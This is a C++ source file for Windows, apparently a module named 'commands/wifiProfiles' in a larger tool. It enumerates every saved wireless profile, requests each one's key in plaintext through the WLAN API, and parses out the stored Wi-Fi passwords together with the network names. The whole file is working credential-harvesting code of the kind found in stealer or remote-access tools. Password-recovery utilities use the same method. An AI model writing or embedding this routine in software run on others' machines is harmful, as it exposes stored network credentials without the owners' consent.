#include "commands/wifiProfiles.h"

#ifdef ENABLE_WIFI
std::string WstringToUtf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string str(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size, nullptr, nullptr);
    str.resize(size - 1);
    return str;
}

class WlanHandle {
public:
    WlanHandle() {
        DWORD negotiatedVersion;
        DWORD result = WlanOpenHandle(WLAN_API_VERSION_2_0, nullptr, &negotiatedVersion, &handle);
        if (result != ERROR_SUCCESS) handle = nullptr;
    }
    ~WlanHandle() { if (handle != nullptr) WlanCloseHandle(handle, nullptr); }
    HANDLE get() { return handle; }
private:
    HANDLE handle = nullptr;
};

std::vector<std::pair<std::string, std::string>> ExtractWifiPasswords() {
    std::vector<std::pair<std::string, std::string>> wifiProfiles;

    WlanHandle wlanHandle;
    if (wlanHandle.get() == nullptr) return wifiProfiles;

    PWLAN_INTERFACE_INFO_LIST interfaceList = nullptr;
    if (WlanEnumInterfaces(wlanHandle.get(), nullptr, &interfaceList) != ERROR_SUCCESS || !interfaceList) {
        return wifiProfiles;
    }

    struct InterfaceListCleanup {
        PWLAN_INTERFACE_INFO_LIST ptr;
        ~InterfaceListCleanup() { if (ptr) WlanFreeMemory(ptr); }
    } cleanup{ interfaceList };

    for (DWORD i = 0; i < interfaceList->dwNumberOfItems; i++) {
        WLAN_INTERFACE_INFO& interfaceInfo = interfaceList->InterfaceInfo[i];
        PWLAN_PROFILE_INFO_LIST profileList = nullptr;
        if (WlanGetProfileList(wlanHandle.get(), &interfaceInfo.InterfaceGuid, nullptr, &profileList) != ERROR_SUCCESS || !profileList) {
            continue;
        }

        struct ProfileListCleanup {
            PWLAN_PROFILE_INFO_LIST ptr;
            ~ProfileListCleanup() { if (ptr) WlanFreeMemory(ptr); }
        } profileCleanup{ profileList };

        for (DWORD j = 0; j < profileList->dwNumberOfItems; j++) {
            std::wstring profileName = profileList->ProfileInfo[j].strProfileName;
            DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            DWORD access = 0;
            LPWSTR profileXml = nullptr;
            if (WlanGetProfile(wlanHandle.get(), &interfaceInfo.InterfaceGuid, profileName.c_str(), nullptr, &profileXml, &flags, &access) != ERROR_SUCCESS || !profileXml) {
                continue;
            }

            struct XmlCleanup {
                LPWSTR ptr;
                ~XmlCleanup() { if (ptr) WlanFreeMemory(ptr); }
            } xmlCleanup{ profileXml };

            std::string xmlStr = WstringToUtf8(std::wstring(profileXml));
            std::string keyStart = "<keyMaterial>";
            std::string keyEnd = "</keyMaterial>";
            size_t startPos = xmlStr.find(keyStart);
            size_t endPos = xmlStr.find(keyEnd);
            std::string password;

            if (startPos != std::string::npos && endPos != std::string::npos) {
                startPos += keyStart.length();
                password = xmlStr.substr(startPos, endPos - startPos);
            }

            std::string name = WstringToUtf8(profileName);
            if (!password.empty()) {
                wifiProfiles.emplace_back(name, password);
            }
        }
    }

    return wifiProfiles;
}
#endif